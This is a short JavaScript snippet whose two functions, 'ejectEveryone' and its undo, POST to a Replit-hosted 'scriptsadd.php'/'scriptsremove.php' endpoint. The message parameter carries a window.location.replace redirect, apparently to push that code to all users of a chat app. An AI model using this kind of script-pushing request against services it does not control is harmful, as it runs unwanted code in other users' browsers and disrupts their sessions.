async function ejectEveryone() {
  const response = await fetch('https://wechat-db.harleydyson.repl.co/call/scriptsadd.php?message=window.location.replace("../../../"); ', {
    method: 'POST',
    headers: {
    }
  });
  response.json().then(data => {
    console.log(data);
  });
}
async function undoEjectEveryone() {
  const response = await fetch('https://wechat-db.harleydyson.repl.co/call/scriptsremove.php?message=window.location.replace("../../../"); ', {
    method: 'POST',
    headers: {
    }
  });
  response.json().then(data => {
    console.log(data);
  });
}